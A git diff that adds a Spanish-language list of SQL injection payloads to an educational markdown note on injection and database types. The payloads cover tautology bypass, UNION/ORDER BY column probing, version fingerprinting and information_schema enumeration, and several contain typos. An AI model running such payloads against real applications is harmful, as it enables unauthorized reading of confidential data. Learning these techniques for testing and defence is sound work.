@@ -25,3 +25,37 @@ Asimismo, es necesario hacer una breve distinción de los diferentes tipos de ba
 - **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.
 
 Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.
+
+posibles payloads
+```
+' or 1-1 --
+```
+```
+' union select null, null
+```
+o su alternativa 
+```
+' order by <numero de filas que estimamos>
+```
+
+en el caso de que el numero de columnas no sea suficiente para lo que queremos obtener
+```
+' union select concat(campoa,-,campob) from tablaObjetivo
+```
+
+para saber que tipo de base de datos esta corriendo podemos ejecutar las siguientes querys
+1 mysql y microsoft
+2 oracle
+3 postgresql
+```
+union select @@verison --
+union select * from v$version
+union select version()
+```
+
+para averiguar tablas y columnas dentro de las tablas podemos usar los comandos, una vez que sepamos el numero de columnas del que dispongamos
+
+```
+' union select null, table_name from information_schema.tables
+' union select null, column_name from information_schema.colums where table_name = '<nombre de la tabla que queremos observar>'
+```
